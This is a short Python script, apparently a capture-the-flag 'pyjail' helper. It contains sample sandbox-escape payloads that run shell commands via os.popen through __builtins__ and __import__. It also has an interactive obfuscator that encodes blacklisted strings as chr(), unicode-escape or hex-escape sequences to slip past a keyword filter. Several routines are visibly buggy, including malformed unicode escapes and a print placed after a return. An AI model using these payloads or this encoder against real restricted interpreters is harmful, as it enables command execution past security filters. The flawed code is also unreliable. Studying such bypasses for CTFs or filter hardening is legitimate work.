# print(ord('o'))

# payload = "print(globals()['__builtins__']['__import__']('os').popen(command).read())"
import tokenize
from io import BytesIO

print("getattr(__import__('os'), 'popen')('dir').read()")
#payload = "print(globals()['__builtins__']['__import__']('os').popen('dir').read())"

def chr_obfuscation(string):
    global payload
    element = list(string)
    # print(element)
    empty = ""
    for char in element:
        empty += f"chr({ord(char)})"
        empty += "+"
   
    chr_representation = f'"".join([{empty[:-1]}])'
    # print(f"chr representation {chr_representation}")

    payload = payload.replace(f"'{string}'", chr_representation)
    
    return payload
    print(f"Obfuscated payload\n{payload}")

def unicode_obfuscation(string):
    global payload
    element = list(string)
    # print(element)
    empty = "'"
    for char in element:
        integer = ord(char)
        empty += f"\\u{hex(integer)}"
   
    empty += "'"
    empty = empty.replace("x", "0")
    # print(empty)
    # unicode_representation = f'"".join([{empty[:-1]}])'
    # print(f"unicode escape sequence {unicode_representation}")

    payload = payload.replace(f"'{string}'", empty)
    print(f"Obfuscated payload\n{payload}")

def hex_obfuscation(string):
    global payload
    element = list(string)
    # print(element)
    empty = "'"
    for char in element:
        integer = ord(char)
        empty += f"\\{hex(integer)}"
   
    empty += "'"
    empty = empty.replace("0x", "x")
    # print(empty)
    # unicode_representation = f'"".join([{empty[:-1]}])'
    # print(f"unicode escape sequence {unicode_representation}")

    payload = payload.replace(f"'{string}'", empty)
    print(f"Obfuscated payload\n{payload}")

#    'os' --> "".join([chr(111), chr(115)]


# tokens = tokenize.tokenize(BytesIO(payload.encode('utf-8')).readline)

# weak_blacklist = ['os', 'popen', 'dir']
weak_blacklist = ['os', 'popen', 'dir', '__builtins__', '__import__']
print("print(globals()['__builtins__']['__import__']('os').popen('dir').read())")

payload = ""
def obfuscate():
    global payload 
    payload = input("Payload here: ")
    obfuscation_choice = int(input("Choose obfuscation method"))
    if obfuscation_choice == 1:
        obfuscation_method = chr_obfuscation
    elif obfuscation_choice == 2:
        obfuscation_method = unicode_obfuscation
    else:
        obfuscation_method = hex_obfuscation

    tokens = tokenize.tokenize(BytesIO(payload.encode('utf-8')).readline)
    for token in tokens:
        if token.type == 3:
            string = token.string.strip("'\"")
            # print(f"String {string}")

            if string in weak_blacklist:
                obfuscation_method(string)

    print(f"Obfuscated payload\n{payload}")

obfuscate()